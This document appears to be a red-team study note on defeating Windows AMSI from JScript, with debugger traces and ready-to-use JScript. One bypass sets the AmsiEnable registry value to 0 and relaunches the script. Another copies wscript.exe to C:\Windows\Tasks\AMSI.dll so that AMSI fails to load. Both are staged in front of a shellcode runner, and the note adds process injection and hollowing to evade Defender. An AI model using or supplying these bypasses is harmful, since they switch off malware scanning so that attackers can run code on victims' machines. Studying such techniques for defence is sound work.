---
title: Bypassing AMSI in JScript
draft: false
tags:
  - red-teaming
  - windows
  - amsi
  - jscript
  - evasion
---
 
# AMSI API Flow

Jscript code is executed by wscript.exe, so we have to hook it with Frida. The problem is that wscript.exe terminates as soon as the Jscript finishes. To solve this we can place the following code at the beginning and capture the PID with process explorer:
```csharp
WScript.Sleep(20000);
```

After that, we can hook the wscript.exe process:
```powershell
PS C:\> frida-trace -p 708 -x amsi.dll -i Amsi*
```

_AmsiScanString_ and _AmsiScanBuffer_ were called but _AmsiOpenSession_ is not. This is because Jscript handles each command in a single session while PowerShell processes each in a separate session.

---
# Bypass AMSI via Registry Keys

Jscript tries to query the "AmsiEnable" registry key from the HKCU hive before initializing AMSI. If this key is set to "0", AMSI is not enabled for the Jscript process.

This query is performed in the _JAmsi::JAmsiIsEnabledByRegistry_ function inside **Jscript.dll**, which is only called when wscript.exe is started.

1. Lets open WinDbg and enter the full path to wscript.exe with the Jscript shellcode as the argument:
![[Pasted image 20260708225115.png]]

2. Lets set a breakpoint at the jscript!JAmsi::JAmsiIsEnabledByRegistry function call:
```bash
> bu jscript!JAmsi::JAmsiIsEnabledByRegistry
> g
```

> [!Info]
> Since jscript.dll is not loaded when we set the breakpoint, we cannot use bp and must instead use the unresolved breakpoint command bu that tracks loaded modules. As soon as jscript.dll is loaded, it will set the breakpoint automatically.

3. Lets unassemble the function:
```bash
> u rip L20

00007fff`a3a868f1 488d15e8cb0800  lea     rdx,[jscript!`string' (00007fff`a3b134e0)]
00007fff`a3a868f8 48c7c101000080  mov     rcx,0FFFFFFFF80000001h
00007fff`a3a868ff ff15f3a60800    call    qword ptr [jscript!_imp_RegOpenKeyExW (00007fff`a3b10ff8)]
...
...
00007fff`a3a86932 488d1587cb0800  lea     rdx,[jscript!`string' (00007fff`a3b134c0)]
00007fff`a3a86939 ff15b1a60800    call    qword ptr [jscript!_imp_RegQueryValueExW (00007fff`a3b10ff0)]
```

We can see that Win32 [_RegOpenKeyExW_](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw) API opens the registry key, and the key is supplied in the second argument located at RDX (`7fff'a3b134c0`). Lets dump its content:
```
> du 00007fff`a3b134e0
00007fff`a3b134e0  "SOFTWARE\Microsoft\Windows Scrip"
00007fff`a3b13520  "t\Settings"
```

We can also see a second call to  [_RegQueryValueExW_](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexw) Win32 API, lets dump its contents:
```
> du 7fff`a3b134c0
00007fff`a3b134c0  "AmsiEnable"
```

We can see that it reads the registry path `SOFTWARE\Microsoft\Windows Script\Settings` and the value which is `AmsiEnable`.

4. Lets bypass AMSI by creating the key and setting its value to "0":
```csharp
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
sh.RegWrite(key, 0, "REG_DWORD");
```

5. This only works if the registry key is set before the wscript.exe process is started. Lets improve the AMSI bypass by implementing a check for the **AmsiEnable** registry key. If it exists, we'll execute the shellcode runner, but if it doesn't, we'll create it and execute the Jscript again (The [_full code_](https://github.com/mdsecactivebreach/SharpShooter/blob/master/modules/amsikiller.py)):
```csharp
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
	// check if the registry key exists
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, ''); // if it doesnt exist, throw exception and execute the catch
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD"); // disable the AmsiEnable value
	// cscript.exe -> CLI tool for wscript.exe
	// -e: scripting engine that will execute the script (jscript.dll GUID)
	// ScriptFullName: the script file to execute must be the original Jscript and we use this attribute to specify it
	// window style (0 > hidden)
	// wait for the script executed by the Run method to be completed
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
	sh.RegWrite(key, 1, "REG_DWORD");
	WScript.Quit(1);
}

// JS shellcode goes here
```

> [!Note]
> Prepend it to the DotNetToJscript-generated shellcode runner

TODO: Combine the AMSI bypass with the shellcode runner, writing fully-weaponized client-side code execution with Jscript.

TODO:Experiment with SharpShooter to generate the same type of payload with an AMSI bypass.

---
# Bypass AMSI via Tampering

AMSI requires AMIS.dll to run the AMSI functions. If we could prevent AMSI.dll from loading or load our own version of it, we could force the AMSI implementation in wscript.exe to produce an error and abort.

We require administrative permissions to overwrite AMSI.DLL since its placed in the `C:\Windows\System32` directory. However we could try to perform a DLL hijacking attack by exploiting DLL search order.

1. Lets open WinDbg and enter the full path to wscript.exe with the Jscript shellcode as the argument:
![[Pasted image 20260708225115.png]]

2. Lets list if AMSI.DLL has been loaded:
```
> lm m amsi
Browse full module list
start             end                 module name
```

3. Next, we have to know exactly what is loading the DLL. To do so, we have to catch the load of the DLL:
```bash
> sxe ld amsi
> g

...
ModLoad: 00007fff`c6e20000 00007fff`c6e34000   C:\Windows\SYSTEM32\amsi.dll
ntdll!NtMapViewOfSection+0x14:
00007fff`d351ea94 c3              ret

> lm m amsi
Browse full module list
start             end                 module name
00007fff`c6e20000 00007fff`c6e34000   amsi       (deferred)   
```

4. Identify the instructions that loaded the AMSI.DLL (Win32 [_LoadLibrary_](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) or [_LoadLibraryEx_](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexw) APIs). We have to enumerate the _callstack_ or the _backtrace_, which is the list of the called functions that led to the current execution point:
```
> k
...
09 00000085`733ed100 00007fff`a3a84ed8 KERNELBASE!LoadLibraryExW+0x161
0a 00000085`733ed170 00007fff`a3a84c6c jscript!COleScript::Initialize+0x2c
...
```

5. Unassemble the function in the callstack:
```
> u jscript!COleScript::Initialize LA

00007fff`a3a84ec5 41b800080000    mov     r8d,800h
00007fff`a3a84ecb 488d0ddee40800  lea     rcx,[jscript!`string' (00007fff`a3b133b0)]
```

6. Lets check the first argument of the function which is the DLL to load:
```
> du 7fff`a3b133b0
00007fff`a3b133b0  "amsi.dll"
```

We can see that it doesnt use the full path. However, the third argument is 0x800 which means LOAD_LIBRARY_SEARCH_SYSTEM32, forcing to load the library in the legitimate folder.

Instead of trying to hijack the DLL, we could force an error when loading the DLL by renaming **wscript.exe** to **amsi.dll** and executing it. The renamed amsi.dll will still be an executable but we must take into account 2 things:
1. If a process named "amsi.dll" tries to load a DLL of the same name, _LoadLibraryExW_ will report that it's already in memory and abort the load to improve efficiency. Any attempt to use the AMSI Win32 API will fail, causing AMSI itself to be disabled.
2. Running a file with a **.dll** extension will fail since DLLs are normally loaded, not executed. This behavior is actually caused by the Win32 [_ShellExecute_](https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea) API, which is used by cmd.exe. If we instead use the [_CreateProcess_](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) Win32 API (same as [_Exec_](https://ss64.com/vb/exec.html) method of the _WScript.Shell_), the file extension is ignored and the file header would be parsed to determine if it is a valid executable.

AMSI Bypass block:
```csharp
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
	// check if the executable has already been copied:
	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
	{
		throw new Error(1, '');
	}
}
catch(e)
{
	// copy wscript.exe to a writable executable folder and rename it AMSI.dll:
	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
	// execute the copy supplying the original Jscript:
	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
	WScript.Quit(1);
}

// JS shellcode runner goes here
```

This will generate a reverse shell for a couple of seconds because we bypass AMSI but Windows Defender detects a process names AMSI.dll and flags it.

To bypass this we could:
1. Perform process migration — use Meterpreter `migrate` or a C# runner that calls `OpenProcess` / `VirtualAllocEx` / `WriteProcessMemory` / `CreateRemoteThread` targeting `explorer.exe`. See [[Process Injection and Migration]] for the full implementation.

2. Use a shellcode runner that performs process injection or hollowing

**Process Injection from JScript** — embed a DotNetToJScript runner invoking the C# injection code from [[Process Injection and Migration]]. The VirtualAllocEx/WriteProcessMemory/CreateRemoteThread chain runs inside the .NET runtime loaded by JScript.

**Process Hollowing from JScript** — similarly, embed the process hollowing C# code from [[Process Injection and Migration]] in a DotNetToJScript wrapper. The spawned hollow process (e.g. `svchost.exe`) appears legitimate.

> [!Note]
> The key advantage of migration/injection/hollowing after the AMSI.dll rename is that the process named `AMSI.dll` which triggered Defender is killed, and the payload lives in a legitimate process going forward.




---
# Related Notes

- [[Antimalware Scan Interface (AMSI)]] — AMSI architecture
- [[Bypassing AMSI With Reflection in PowerShell]] — PS managed-code bypass
- [[Wrecking AMSI in PowerShell]] — binary-patch approach
- [[Process Injection and Migration]] — process injection/hollowing implementations
- [[Bypassing AppLocker with JScript]] — JScript delivery via MSHTA / XSL
